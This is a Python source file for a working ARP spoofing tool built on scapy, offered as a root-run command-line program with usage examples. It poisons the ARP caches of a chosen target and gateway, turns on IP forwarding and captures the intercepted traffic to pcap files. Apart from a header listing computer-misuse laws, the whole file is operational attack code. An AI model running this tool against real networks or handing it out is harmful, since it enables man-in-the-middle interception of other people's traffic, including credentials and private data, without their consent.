#!/home/kali/cyber-attack-test/env/bin/python
'''
=============================================================
- 中国大陆: 刑法第285条 (非法侵入计算机信息系统罪) - 可导致刑事处罚
- 美国: 18 U.S. Code § 1030 (计算机欺诈和滥用法案) - 可导致重罪指控
- 英国: Computer Misuse Act 1990 (计算机滥用法案) - 可导致刑事起诉
- 禁止脚本小子
=============================================================
'''

from ipaddress import ip_address
from multiprocessing import Process, Event
from scapy.sendrecv import sendp, srp, sniff
from scapy.layers.l2 import ARP, Ether
from scapy.utils import wrpcap
from scapy.config import conf
from datetime import datetime
import argparse
import signal
import sys
import os

RED_BOLD = '\033[1;31m'
BLUE_BOLD = '\033[1;34m'
RESET = '\033[0m'

def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    """
    A class to perform ARP spoofing (cache poisoning) attacks on a target device.

    This class facilitates both active and passive ARP spoofing strategies to intercept
    network traffic between a target device and the gateway. It supports automatic
    restoration of ARP tables upon attack completion or interruption.

    Attributes:
        target (str): IPv4 address of the target device.
        gateway (str): IPv4 address of the network gateway.
        interface (str): Network interface to use for the attack.
        count (int): Number of packets to capture during the attack (default: 200).
        delay (int): Delay in seconds between ARP spoofing packets (default: 2).
        autorestore (bool): Flag to automatically restore ARP tables post-attack.
        active (bool): Flag to select between active or passive attack mode.
        poison_event (multiprocessing.Event): Event to control poisoning process.
        sniff_process (multiprocessing.Process): Process handling packet capture.

    Methods:
        run(): Initiates the ARP spoofing attack with the configured parameters.
    """
    def __init__(self, target: str, gateway: str, interface:str, count: int = 200, delay=2, autorestore: bool = True, active=True, target_mac=None, gateway_mac=None):
        '''
        :param target: Target IPv4 address
        :param gateway: Gateway IPv4 address
        :param interface: Selected network interface
        :param count: Number of packets to sniff, default is 200
        :param autorestore: Whether to restore ARP table automatically, default is True
        '''
        # Raise an error immediately during initialisation for invalid input
        is_valid_ipv4((target, gateway))
        # Configured to spoof responses solely upon detecting ARP requests, but omitted the target and gateway MAC addresses
        if (not active) and not (target_mac and gateway_mac):
            raise InvalidConfigurationError('PassiveAttacker selected, but target and gateway MAC addresses not provided')
        self.autorestore = autorestore
        self.target = target
        self.gateway = gateway
        self.target_mac = target_mac
        self.gateway_mac = gateway_mac
        self.count = count
        self.interface = interface
        self.delay = delay
        self.active = active
        self.poison_event = None
        self.sniff_process: Process
        conf.iface = interface
        conf.verb = 0

        print(f'{BLUE_BOLD}Currently using interface {interface}: {RESET}')

    def run(self):
        self.target_mac = get_mac(self.target) if self.target_mac is None else self.target_mac
        self.gateway_mac = get_mac(self.gateway) if self.gateway_mac is None else self.gateway_mac
        if not (self.target_mac and self.gateway_mac):
            raise MACNotFoundError('Target or gateway unreachable')

        with IPForwarding():
            attacker = ActiveAttacker() if self.active else PassiveAttacker()
            # An Event instance is created if and only if the ActiveAttacker strategy is selected
            if isinstance(attacker, ActiveAttacker):
                self.poison_event = Event()
            attacker.start(self)
        return self.target_mac

            
class ActiveAttacker:
    
    def poison(self, arper: Arper, event: Event):   # type: ignore
        # If you press CTRL-C, it terminates immediately
        signal.signal(signal.SIGINT, signal.SIG_DFL)
        # Craft packets aimed at the target device
        ether1 = Ether(dst=arper.target_mac)
        arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
        poison_target = ether1 / arp1

        print(f'IP src: {poison_target[ARP].psrc}')
        print(f'IP dst: {poison_target[ARP].pdst}')
        print(f'MAC src: {poison_target[Ether].src}')
        print(f'MAC dst: {poison_target[Ether].dst}')
        print(poison_target.summary())
        print('-' * 30)
        
        # Craft packets aimed at the gateway
        ether2 = Ether(dst=arper.gateway_mac)
        arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
        poison_gateway = ether2 / arp2
        
        print(f'IP src: {poison_gateway[ARP].psrc}')
        print(f'IP dst: {poison_gateway[ARP].pdst}')
        print(f'MAC dst: {poison_gateway[Ether].dst}')
        print(f'MAC src: {poison_gateway[Ether].src}')
        print(poison_gateway.summary())
        print('-' * 30)
        print(f'Beginning the ARP poison. {RED_BOLD}[CTRL-C to stop]{RESET}')
        while not event.is_set():
            sys.stdout.write('.')
            sys.stdout.flush()
            sendp(poison_target)
            sendp(poison_gateway)
            event.wait(arper.delay)

    def sniff_and_store(self, arper: Arper):
        print(f'Sniffing {arper.count} packets')
        bpf_filter = f'host {arper.target} and not arp'
        signal.signal(signal.SIGINT, handle_sigint)
        packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)    # The sniff function can handle KeyboardInterrupt

        with NoInterrupt():
            arper.poison_event.set()    # type: ignore
            wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
            print(f'Got {len(packets)} packets')

    def restore(self, arper: Arper):
        '''
        Automatically restore the ARP table after the attack ends 
        or the attack is cancelled
        '''
        if arper.autorestore:
            print('Restoring ARP tables...')
            sendp(
                Ether(src=arper.gateway_mac, 
                      dst=arper.target_mac) / 
                ARP(
                    op=2, 
                    psrc=arper.gateway, 
                    hwsrc=arper.gateway_mac, 
                    pdst=arper.target, 
                    hwdst=arper.target_mac, 
                    ), 
                count=5
                )
            sendp(
                Ether(src=arper.target_mac, 
                      dst=arper.gateway_mac) / 
                ARP(
                    op=2, 
                    psrc=arper.target, 
                    hwsrc=arper.target_mac, 
                    pdst=arper.gateway, 
                    hwdst=arper.gateway_mac
                    ), 
                count=5)
    
    def start(self, arper:Arper):
        try:
            arper.sniff_process = Process(target=self.sniff_and_store, args=[arper])
            arper.sniff_process.start()
            while not arper.sniff_process.is_alive():
                pass
            poison_process = Process(target=self.poison, args=[arper, arper.poison_event])
            poison_process.start()
            arper.sniff_process.join()
        except (KeyboardInterrupt, Exception) as e:
            with NoInterrupt():
                if isinstance(e, KeyboardInterrupt):
                    print('Aborted')
        else:
            with NoInterrupt():
                arper.poison_event.set()    # type: ignore
                poison_process.join()
        finally:
            with NoInterrupt():
                self.restore(arper)
            

class PassiveAttacker:

    def poison(self, arper: Arper):
        # Same as above
        signal.signal(signal.SIGINT, signal.SIG_DFL)
        self.target = arper.target
        ether1 = Ether(dst=arper.target_mac)
        arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
        self.poison_target = ether1 / arp1
        ether2 = Ether(dst=arper.gateway_mac)
        arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
        self.poison_gateway = ether2 / arp2
        bpf_filter = (
            f"(src host {arper.target} or src host {arper.gateway}) "
            f"and arp and arp[6:2] = 1"
        )
        sniff(filter=bpf_filter, prn=self.spoof, store=0, iface=arper.interface)

    def spoof(self, packet):
        pkt = self.poison_target if packet[ARP].psrc == self.target else self.poison_gateway
        sendp(pkt, iface=self.iface)

    def sniff_and_store(self, arper: Arper, poison_process: Process):
        print(f'Sniffing {arper.count} packets')
        bpf_filter = f'host {arper.target} and not arp'
        signal.signal(signal.SIGINT, handle_sigint)
        # The sniff func automatically handles KeyboardInterrupt exceptions
        packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)
        # therefore the following code will be executed
        
        with NoInterrupt():
            poison_process.kill()
            poison_process.join()   # Hence, attempts to terminate it elsewhere in the code would be redundant
            wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
            print(f'Got {BLUE_BOLD}{len(packets)}{RESET} packets')

    def restore(self, arper: Arper):
        '''
        Automatically restore the ARP table after the attack ends 
        or the attack is cancelled
        '''
        if arper.autorestore:
            print('Restoring ARP tables...')
            sendp(
                Ether(src=arper.gateway_mac, 
                      dst=arper.target_mac) / 
                ARP(
                    op=2, 
                    psrc=arper.gateway, 
                    hwsrc=arper.gateway_mac, 
                    pdst=arper.target, 
                    hwdst=arper.target_mac, 
                    ), 
                count=5
                )
            sendp(
                Ether(src=arper.target_mac, 
                      dst=arper.gateway_mac) / 
                ARP(
                    op=2, 
                    psrc=arper.target, 
                    hwsrc=arper.target_mac, 
                    pdst=arper.gateway, 
                    hwdst=arper.gateway_mac
                    ), 
                count=5)

    def start(self, arper: Arper):
        self.iface = arper.interface
        print(f"{RED_BOLD}Ensure that promiscuous mode is enabled for the interface at least. {RESET}")
        try:
            poison_process = Process(target=self.poison, args=[arper])
            arper.sniff_process = Process(target=self.sniff_and_store, args=[arper, poison_process])
            arper.sniff_process.start()
            while not arper.sniff_process.is_alive():
                pass
            poison_process.start()
            arper.sniff_process.join()
        except (Exception, KeyboardInterrupt) as e:   # Aborted
            with NoInterrupt():
                if isinstance(e, KeyboardInterrupt):
                    print('Aborted. ')
        finally:
            with NoInterrupt():
                self.restore(arper)

def handle_sigint(signum, frame):
    raise KeyboardInterrupt

def is_valid_ipv4(addrs):
    addr1, addr2 = addrs
    try:
        addr1, addr2 = ip_address(addr1), ip_address(addr2)
        if (addr1.version != 4) or (addr2.version != 4):
            raise InvalidIPAddressError('ARP cache poisoning requires IPv4')
    except ValueError:
        raise InvalidIPAddressError(f'Invalid IP format: {(addr1, addr2)}')


class NoInterrupt:
    """
    Prevent users from repeatedly triggering KeyboardInterrupt, 
    ensuring crucial operations proceed smoothly
    """
    def __enter__(self):
        self.original = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        signal.signal(signal.SIGINT, self.original)

class IPForwarding:
    def __enter__(self):
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            self.original_value = f.read().strip()
        if self.original_value != '1':
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.original_value != '1':
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write(self.original_value + '\n')

class ARPSpoofingError(Exception):
    pass

class InvalidIPAddressError(ARPSpoofingError):
    pass

class MACNotFoundError(ARPSpoofingError):
    pass

class InvalidConfigurationError(ARPSpoofingError):
    pass

if __name__ == '__main__':
    '''ARP Spoofing Tool'''
    if os.getuid() != 0:
        raise PermissionError(f'{RED_BOLD}This tool requires root privileges to run{RESET}')
    
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description='ARP Spoofing Tool\nThis tool performs ARP spoofing attacks, allowing interception of network traffic from target devices.',
        epilog='''Examples:
  %(prog)s 192.168.1.100 -g 192.168.1.1
  %(prog)s 192.168.1.100 -g 192.168.1.1 -i eth0 -num 500 --no-restore'''
    )
    
    parser.add_argument(
        'target',
        help='IPv4 address of the target device'
    )
    
    parser.add_argument(
        '-g', '--gateway',
        metavar='IP_ADDRESS',
        required=True,
        help='IPv4 address of the network gateway',
        dest='gateway'
    )
    
    parser.add_argument(
        '-i', '--interface',
        metavar='INTERFACE',
        help='Network interface to use (default: wlan0)',
        default='wlan0'
    )
    
    parser.add_argument(
        '-n', '--no-restore',
        help='Do not automatically restore ARP tables after attack',
        action='store_false',
        dest='n'
    )
    
    parser.add_argument(
        '--num',
        type=int,
        metavar='COUNT',
        help='Number of packets to capture (default: 200)',
        default=200
    )
    
    args = parser.parse_args()

    try:
        myarp = Arper(target=args.target, 
                      gateway=args.gateway, 
                      interface=args.interface, 
                      count=args.num, 
                      autorestore=args.n)
        myarp.run()
    except (InvalidIPAddressError, MACNotFoundError) as e:
        print(f'{RED_BOLD}Configuration error: {e}{RESET}')
        sys.exit(1)
    except PermissionError as e:
        print(f'{RED_BOLD}{e}{RESET}')
        sys.exit(1)